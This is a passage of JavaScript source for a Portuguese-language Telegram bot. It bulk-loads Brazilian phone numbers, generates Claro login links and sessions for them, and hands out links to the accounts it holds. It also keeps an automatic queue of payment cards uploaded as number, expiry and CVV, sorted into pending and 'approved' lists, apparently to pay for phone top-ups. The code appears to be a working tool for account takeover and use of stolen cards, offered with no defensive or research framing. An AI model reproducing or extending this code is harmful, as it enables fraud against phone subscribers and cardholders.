    return;
  }

  if (data.startsWith('dbscan:')) {
    await loadSavedNumber(chatId, data.slice(7), { editMsg: { message_id: messageId } });
    return;
  }

  if (data.startsWith('dbpage:')) {
    await sendDbList(chatId, Number(data.slice(7)) || 0, messageId);
    return;
  }

  if (data === 'dbvals') {
    await sendValueStock(chatId);
    return;
  }

  if (data.startsWith('dbvaln:')) {
    const rest = data.slice(7);
    const sep = rest.indexOf(':');
    const cents = Number(sep === -1 ? rest : rest.slice(0, sep));
    const skip = sep === -1 ? '' : rest.slice(sep + 1);
    await sendLinkForValue(chatId, cents, { excludeMsisdn: skip });
    return;
  }

  if (data.startsWith('dbval:')) {
    await sendLinkForValue(chatId, Number(data.slice(6)));
  }
}

async function loadSavedNumber(chatId, msisdn, { editMsg = null } = {}) {
  const number = normalizeBrMobile(msisdn);
  const row = number ? getNumber(number) : null;
  if (!row?.link) {
    await send(chatId, '❌ Número não está no banco. Envie o .txt ou o número para gerar.');
    return;
  }

  if (busy.has(chatId)) {
    await send(chatId, '⏳ Aguarde…');
    return;
  }

  busy.add(chatId);
  let statusMsg = editMsg;
  if (!statusMsg) {
    statusMsg = await send(chatId, `⚡️ Carregando <code>${number}</code> do banco…`);
  } else {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `⚡️ Carregando <code>${number}</code> do banco…`,
      parse_mode: 'HTML',
    });
  }

  try {
    let link = toLoginUrl(row.link);
    let session;
    try {
      session = await createSession(parseLink(link).jwt);
    } catch {
      const generated = await fetchClaroLoginLink(number);
      link = generated.link;
      session = await createSession(parseLink(link).jwt);
    }

    const refreshed = await refreshMsisdnProducts(number, {
      link,
      sessionId: session.id,
      identifier: session.identifier,
    });
    const valores = refreshed.valores ?? [];
    const listed = refreshed.listedProducts ?? 0;

    setCache(chatId, {
      link,
      walletAuth: null,
      cards: [],
      sessionId: session.id,
      msisdn: session.identifier,
      valores,
    });

    const lines = [
      `<b>⚡️ ${session.identifier}</b> (banco)`,
      '',
      `<b>Valores (${valores.length}):</b> ${formatValoresShort(valores)}`,
    ];
    if (!valores.length && listed > 0) {
      lines.push('', `⚠️ A Claro lista ${listed} valor(es), mas <b>nenhum está disponível</b> para recarga.`);
    }
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: lines.join('\n'),
      parse_mode: 'HTML',
      reply_markup: valores.length
        ? buildValueKeyboard(valores)
        : { inline_keyboard: [[{ text: '🔍 Varrer de novo', callback_data: `dbscan:${number}` }]] },
    });
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `❌ <b>Erro:</b> ${err.message.replace(/</g, '&lt;')}`,
      parse_mode: 'HTML',
    });
  } finally {
    busy.delete(chatId);
  }
}

function buildDbListMarkup(page, total) {
  const pageSize = 8;
  const pages = Math.max(1, Math.ceil(total / pageSize));
  const row = [];
  if (page > 0) row.push({ text: '⬅️', callback_data: `dbpage:${page - 1}` });
  row.push({ text: `${page + 1}/${pages}`, callback_data: 'noop' });
  if (page + 1 < pages) row.push({ text: '➡️', callback_data: `dbpage:${page + 1}` });
  return { inline_keyboard: [row] };
}

async function sendDbList(chatId, page = 0, messageId = null) {
  const pageSize = 8;
  const total = countNumbers({ onlyOk: true });
  const rows = listNumbers({ limit: pageSize, offset: page * pageSize, onlyOk: true });
  const withVal = countWithValues();
  if (!rows.length) {
    const text = '🗄 Banco vazio. Envie um arquivo <code>.txt</code> com um número por linha.';
    if (messageId) {
      await tg('editMessageText', {
        chat_id: chatId,
        message_id: messageId,
        text,
        parse_mode: 'HTML',
      });
    } else {
      await send(chatId, text);
    }
    return;
  }

  const lines = [
    `<b>🗄 Banco</b> — ${total} números (${withVal} com valores)`,
    '',
  ];
  const keyboard = [];
  for (const r of rows) {
    lines.push(`<code>${r.msisdn}</code> — ${formatDbRowValores(r)}`);
    keyboard.push([
      {
        text: `⚡️ ${r.msisdn}`,
        callback_data: `dbusar:${r.msisdn}`,
      },
    ]);
  }
  const nav = buildDbListMarkup(page, total).inline_keyboard[0];
  keyboard.push(nav);
  keyboard.push([{ text: '💰 Pedir valor (link)', callback_data: 'dbvals' }]);

  const payload = {
    chat_id: chatId,
    text: lines.join('\n'),
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: keyboard },
  };
  if (messageId) {
    await tg('editMessageText', { ...payload, message_id: messageId });
  } else {
    await tg('sendMessage', { ...payload, disable_web_page_preview: true });
  }
}

function buildValueStockKeyboard(stock) {
  const rows = [];
  for (let i = 0; i < stock.length; i += 2) {
    const row = stock.slice(i, i + 2).map((v) => ({
      text: `${v.name || formatBRL(v.value)} (${v.count})`,
      callback_data: `dbval:${v.value}`,
    }));
    rows.push(row);
  }
  return { inline_keyboard: rows };
}

async function sendValueStock(chatId, messageId = null) {
  const stock = listValueStock();
  const total = countNumbers({ onlyOk: true });
  if (!stock.length) {
    const text =
      '💰 Nenhum valor no banco ainda. Envie um <code>.txt</code> com um número por linha.';
    if (messageId) {
      await tg('editMessageText', {
        chat_id: chatId,
        message_id: messageId,
        text,
        parse_mode: 'HTML',
      });
    } else {
      await send(chatId, text);
    }
    return;
  }

  const lines = [
    `<b>💰 Valores disponíveis</b>`,
    `${total} números no banco`,
    '',
    'Toque no valor para receber o <b>link</b> de um número.',
    'Ou envie <code>/valor 20</code>.',
  ];
  const payload = {
    chat_id: chatId,
    text: lines.join('\n'),
    parse_mode: 'HTML',
    reply_markup: buildValueStockKeyboard(stock),
  };
  if (messageId) {
    await tg('editMessageText', { ...payload, message_id: messageId });
  } else {
    await tg('sendMessage', { ...payload, disable_web_page_preview: true });
  }
}

async function sendLinkForValue(chatId, valueCents, { excludeMsisdn } = {}) {
  const cents = Number(valueCents);
  if (!Number.isFinite(cents) || cents <= 0) {
    await send(chatId, 'Valor inválido. Ex: <code>/valor 20</code>');
    return;
  }

  const picked = pickLinkForValue(cents, { excludeMsisdn });
  if (!picked?.link) {
    const left = countForValue(cents);
    await send(
      chatId,
      left
        ? `Não achei outro número com ${formatBRL(cents)}. Restam ${left} (é o mesmo).`
        : `Nenhum número com ${formatBRL(cents)} no banco.`,
    );
    return;
  }

  const link = toLoginUrl(picked.link).replace(/&/g, '&amp;').replace(/</g, '&lt;');
  const label = String(picked.name || formatBRL(cents)).replace(/</g, '&lt;');
  const left = picked.remaining;
  await send(
    chatId,
    [
      `<b>💰 ${label}</b>`,
      `<b>Número:</b> <code>${picked.msisdn}</code>`,
      `<b>Restam:</b> ${left} com esse valor`,
      '',
      link,
    ].join('\n'),
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: `🔄 Outro ${formatBRL(cents)}`, callback_data: `dbvaln:${cents}:${picked.msisdn}` },
          ],
          [
            { text: '💳 Recarregar neste bot', callback_data: `dbusar:${picked.msisdn}` },
            { text: '💰 Valores', callback_data: 'dbvals' },
          ],
        ],
      },
    },
  );
}

async function handleCardsTxtIngest(chatId, text, statusMsg = null) {
  const result = await cardList.ingestText(text);
  const lines = [
    '<b>💳 Cartões adicionados à fila</b>',
    '',
    `Novos: <b>${result.added}</b>`,
    `Total na fila: <b>${result.total}</b>`,
    `Aprovados (histórico): <b>${cardList.countApproved()}</b>`,
    '',
    'No pagamento, toque em <b>🤖 Automático</b>.',
  ];
  const payload = {
    chat_id: chatId,
    text: lines.join('\n'),
    parse_mode: 'HTML',
  };
  if (statusMsg?.message_id) {
    await tg('editMessageText', { ...payload, message_id: statusMsg.message_id });
  } else {
    await send(chatId, payload.text, { parse_mode: 'HTML' });
  }
}

async function sendCartoesFila(chatId) {
  const pending = cardList.countPending();
  const approved = cardList.countApproved();
  const next = cardList.peekPendingLine();
  let nextMask = '—';
  if (next) {
    const parsed = parseCardInput(next);
    if (parsed?.number) nextMask = `****${parsed.number.slice(-4)}`;
  }
  await send(
    chatId,
    [
      '<b>🤖 Fila automática de cartões</b>',
      '',
      `Pendentes: <b>${pending}</b> (<code>cards-pending.txt</code>)`,
      `Aprovados: <b>${approved}</b> (<code>cards-approved.txt</code>)`,
      `Próximo: <code>${nextMask}</code>`,
      '',
      'Envie um <b>.txt</b> com um cartão por linha:',
      '<code>NUMERO|MM|AAAA|CVV</code>',
    ].join('\n'),
  );
}

async function handleTxtDocument(chatId, document) {
  const name = String(document.file_name || '').toLowerCase();
  const mime = String(document.mime_type || '').toLowerCase();
  const isTxt = name.endsWith('.txt') || mime === 'text/plain';
  if (!isTxt) {
    await send(chatId, '❌ Envie um arquivo <code>.txt</code> (um número por linha).');
    return;
  }
  if (busy.has(chatId)) {
    await send(chatId, '⏳ Já tem um processamento em andamento.');
    return;
  }

  busy.add(chatId);
  const statusMsg = await send(chatId, '📥 Baixando arquivo…');
  try {
    const file = await tg('getFile', { file_id: document.file_id });
    const url = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
    const res = await fetch(url);
    const text = await res.text();

    if (/cart/i.test(name) || looksLikeCardsTxt(text)) {
      await handleCardsTxtIngest(chatId, text, statusMsg);
      return;
    }

    const numbers = parseNumbersFromTxt(text);
    if (!numbers.length) {
      throw new Error('Nenhum número válido no arquivo');
    }
    const MAX_NUMBERS = 2000;
    if (numbers.length > MAX_NUMBERS) {
      throw new Error(`Arquivo grande demais (${numbers.length}). Máximo ${MAX_NUMBERS} números.`);
    }

    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `⚙️ <b>${numbers.length}</b> números — um por vez…`,
      parse_mode: 'HTML',
    });

    const t0 = Date.now();
    let lastPaint = 0;
    let finished = false;
    let paintQueue = Promise.resolve();
    let snapshot = {
      done: 0,
      total: numbers.length,
      queued: numbers.length,
      skipped: 0,
      ok: 0,
      fail: 0,
    };

    const paint = (force = false) => {
      if (finished) return;
      const now = Date.now();
      if (!force && now - lastPaint < 1500) return;
      lastPaint = now;
      const { done, total: tot, skipped, ok: o, fail: f, queued } = snapshot;
      const elapsed = Math.max(1, Math.round((now - t0) / 1000));
      paintQueue = paintQueue.then(() => {
        if (finished) return;
        return tg('editMessageText', {
          chat_id: chatId,
          message_id: statusMsg.message_id,
          text: [
            `⚙️ <b>${done}/${tot || queued}</b> deste lote`,
            `✅ ${o}   ❌ ${f}${skipped ? `   ⏭ ${skipped} já no banco` : ''}`,
            `<i>1 por vez · ${elapsed}s</i>`,
          ].join('\n'),
          parse_mode: 'HTML',
        }).catch(() => {});
      });
    };

    const beat = setInterval(() => paint(true), 4000);
    let ingest;
    try {
      ingest = await ingestNumbers(numbers, {
        concurrency: BULK_CONCURRENCY,
        skipOk: true,
        onProgress: (p) => {
          snapshot = p;
          paint(false);
        },
      });
    } finally {
      finished = true;
      clearInterval(beat);
      await paintQueue.catch(() => {});
    }

    const { total, skipped, ok, fail, results } = ingest;
    const withVal = results.filter((r) => r.status === 'ok' && r.valores?.length).length;
    const errors = results.filter((r) => r.status !== 'ok');
    const errorLines = errors.slice(0, 8).map(
      (r) => `• <code>${r.msisdn}</code> — ${(r.error || 'erro').replace(/</g, '&lt;')}`,
    );
    if (errors.length > 8) errorLines.push(`… +${errors.length - 8}`);

    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: [
        '<b>📦 Arquivo processado</b>',
        '',
        `Arquivo: <b>${total}</b>`,
        skipped ? `⏭ Já no banco: <b>${skipped}</b>` : null,
        `✅ Novos: <b>${ok}</b>`,
        `❌ Erros: <b>${fail}</b>`,
        `💰 Com valores neste lote: <b>${withVal}</b>`,
        ...(errorLines.length ? ['', '<b>Falhas:</b>', ...errorLines] : []),
        '',
        fail
          ? 'Envie o mesmo .txt de novo para retentar os erros (os já salvos são pulados).'
          : 'Toque em <b>Pedir valor</b> para receber o link.',
      ]
        .filter((line) => line != null)
        .join('\n'),
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '💰 Pedir valor', callback_data: 'dbvals' }],
          [{ text: '🗄 Ver números', callback_data: 'dbpage:0' }],
        ],
      },
    });
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `❌ <b>Erro:</b> ${err.message.replace(/</g, '&lt;')}`,
      parse_mode: 'HTML',
    });
  } finally {
    busy.delete(chatId);
  }
}

async function handleMessage(msg) {
  const chatId = msg.chat?.id;
  const text = msg.text?.trim() ?? '';

  if (!chatId) return;

  try {
    if (msg.document) {
      await handleTxtDocument(chatId, msg.document);
      return;
    }

    if (rechargeFlow.has(chatId) && text && !text.startsWith('/')) {
      const handled = await handleRechargeInput(chatId, text);
      if (handled) return;
    }

    if (text === '/start' || text === '/help' || text.startsWith('/start@') || text.startsWith('/help@')) {
      await promptRechargeMode(chatId);
      return;
    }

    if (text === '/lista' || text.startsWith('/lista@')) {
      await sendDbList(chatId, 0);
      return;
    }

    if (text === '/valores' || text.startsWith('/valores@')) {
      await sendValueStock(chatId);
      return;
    }

    if (text.startsWith('/valor')) {
      const arg = text.replace(/^\/valor(@\S+)?\s*/, '').trim();
      if (!arg) {
        await sendValueStock(chatId);
        return;
      }
      const cents = parseReaisToCents(arg);
      if (!cents) {
        await send(chatId, 'Uso: <code>/valor 20</code> ou <code>/valor 15,00</code>');
        return;
      }
      await sendLinkForValue(chatId, cents);
      return;
    }

    if (text === '/erros' || text.startsWith('/erros@')) {
      const rows = listErrors({ limit: 20 });
      if (!rows.length) {
        await send(chatId, 'Nenhum erro no banco.');
        return;
      }
      const lines = ['<b>❌ Falhas no banco</b>', ''];
      for (const r of rows) {
        lines.push(`<code>${r.msisdn}</code> — ${(r.error || 'erro').replace(/</g, '&lt;')}`);
      }
      await send(chatId, lines.join('\n'));
      return;
    }

    if (text.startsWith('/usar')) {
      const arg = text.replace(/^\/usar(@\S+)?\s*/, '').trim();
      if (!arg) {
        await send(chatId, 'Uso: <code>/usar 38991121276</code>');
        return;
      }
      await loadSavedNumber(chatId, arg);
      return;
    }

    if (text.startsWith('/apagar')) {
      const arg = text.replace(/^\/apagar(@\S+)?\s*/, '').trim();
      if (!arg) {
        await send(chatId, 'Uso: <code>/apagar 38991121276</code>');
        return;
      }
      const n = normalizeBrMobile(arg);
      if (!n) {
        await send(chatId, '❌ Número inválido.');
        return;
      }
      const ok = deleteNumber(n);
      await send(
        chatId,
        ok ? `🗑 Apaguei <code>${n}</code> do banco.` : 'Não achei esse número no banco.',
      );
      return;
    }

    if (text === '/recarga' || text.startsWith('/recarga@')) {
      await startRechargePicker(chatId);
      return;
    }

    if (text.startsWith('/recarga_para')) {
      const args = text.replace(/^\/recarga_para(@\S+)?\s*/, '').trim().split(/\s+/).filter(Boolean);
      if (args.length < 2) {
        await send(
          chatId,
          'Uso: <code>/recarga_para NUMERO_LOGIN NUMERO_DESTINO</code>\n' +
            'Ex: login <code>91986097858</code> → recarga <code>68992403595</code>',
        );
        return;
      }
      await startRechargePickerForTarget(chatId, args[0], args[1]);
      return;
    }

    if (text === '/backup' || text.startsWith('/backup@')) {
      try {
        const out = execSync(`bash "${join(DATA_DIR, 'backup.sh')}"`, { encoding: 'utf8', env: process.env });
        await send(chatId, `<b>Backup criado</b>\n<pre>${out.replace(/</g, '&lt;').slice(-900)}</pre>`, {
          parse_mode: 'HTML',
        });
      } catch (err) {
        await send(chatId, `❌ Backup falhou: ${err.message}`);
      }
      return;
    }

    if (text === '/status' || text.startsWith('/status@')) {
      await send(chatId, `🟢 Online · ${Math.floor(process.uptime())}s`);
      return;
    }

    if (text === '/cartoes_fila' || text.startsWith('/cartoes_fila@')) {
      await sendCartoesFila(chatId);
      return;
    }

    if (text === '/cartoes' || text.startsWith('/cartoes@')) {
      const entry = getCache(chatId);
      if (!entry?.cards?.length) {
        await send(chatId, '❌ Nenhum cartão em cache. Varredura necessária.');
        return;
      }
      await send(chatId, `<b>Cartões (${entry.cards.length})</b>:`, {
        reply_markup: buildCardKeyboard(entry.cards),
      });
      return;
    }

    const skipWallet = text.startsWith('/scan');
    const link = extractLink(skipWallet ? text.replace(/^\/scan(@\S+)?\s*/, '') : text);

    if (link?.kind === 'msisdn') {
      const mode = chatRechargeMode.get(chatId);
      if (mode === 'same') {
        await startSameNumberRecharge(chatId, link.msisdn);
        return;
      }
      if (!mode) {
        await send(chatId, '👇 Escolha o modo de recarga:', { reply_markup: buildRechargeModeKeyboard() });
        return;
      }
    }

    if (!link) {
      const cents = parseReaisToCents(text);
      if (cents) {
        await sendLinkForValue(chatId, cents);
        return;
      }
      if (text.startsWith('/')) {
        await send(chatId, 'Comando desconhecido. Use /start');
      } else {
        await send(
          chatId,
          '❌ Envie um <b>.txt</b>, um valor (<code>20</code>), o número ou o link JWT.\n/valores lista o estoque.',
        );
      }
      return;
    }

    await doScan(chatId, link, { skipWallet });
  } catch (err) {
    console.error('[msg] error:', err.message);
    await send(chatId, `❌ Erro interno: ${err.message}`).catch(() => {});
  }
}

async function poll() {
  console.log('[bot] polling (+ recarga)…');
  while (true) {
    try {
      const updates = await tg('getUpdates', {
        offset,
        timeout: 25,
        allowed_updates: ['message', 'callback_query'],
      });

      for (const update of updates) {
        offset = update.update_id + 1;
        if (update.message) {
          handleMessage(update.message).catch((e) => console.error('[msg]', e.message));
        }
        if (update.callback_query) {
          handleCallback(update.callback_query).catch((e) => console.error('[cb]', e.message));
        }
      }
    } catch (err) {
      console.error('[bot] poll:', err.message);
      await new Promise((r) => setTimeout(r, 2000));
    }
  }
}

async function main() {
  const me = await tg('getMe');
  const proxy = describeProxy();
  console.log(
    `[bot] @${me.username} online — recarga ${isBrowserRechargeEnabled() ? 'Edge/browser' : 'API'} + banco SQLite` +
      (proxy ? ` · proxy ${proxy}` : ''),
  );
  await tg('deleteWebhook', { drop_pending_updates: false });
  await tg('setMyCommands', {
    commands: [
      { command: 'start', description: '🏠 Início e recarga' },
      { command: 'valores', description: '💰 Link por valor (R$ 20…)' },
      { command: 'lista', description: '🗄 Números no banco' },
      { command: 'recarga', description: '💳 Escolher valor e pagar' },
      { command: 'cartoes_fila', description: '🤖 Fila TXT de cartões' },
      { command: 'cartoes', description: '💳 Cartões da varredura' },
      { command: 'status', description: '🟢 Bot online' },
    ],
  }).catch(() => {});
  poll();
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
